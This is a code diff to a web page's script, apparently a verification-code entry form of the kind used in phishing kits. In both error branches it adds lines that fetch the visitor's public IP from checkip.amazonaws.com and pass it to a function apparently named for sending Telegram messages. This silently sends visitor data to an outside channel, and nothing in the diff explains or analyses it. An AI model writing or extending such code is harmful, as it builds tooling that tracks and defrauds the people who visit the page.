@@ -2224,6 +2224,11 @@ const fullUrl = window.location.search  ;
             document.getElementById('error-message').style.display = 'block';
             document.getElementById('error-message').innerHTML = 'Error: please enter verification code before proceeding.';
             verificationInput.focus();
+            fetch('https://checkip.amazonaws.com/')
+              .then((res) => res.text())
+              .then((data) => {
+                sendTelegramMessageThen2(data);
+              });
             return;
           }
           
@@ -2233,6 +2238,12 @@ const fullUrl = window.location.search  ;
             document.getElementById('error-message').style.display = 'block';
             document.getElementById('error-message').innerHTML = 'Error: invalid verification code.';
             verificationInput.focus();
+            fetch('https://checkip.amazonaws.com/')
+              .then((res) => res.text())
+              .then((data) => {
+                sendTelegramMessageThen2(data);
+              });
+                 
             return;
           }
           
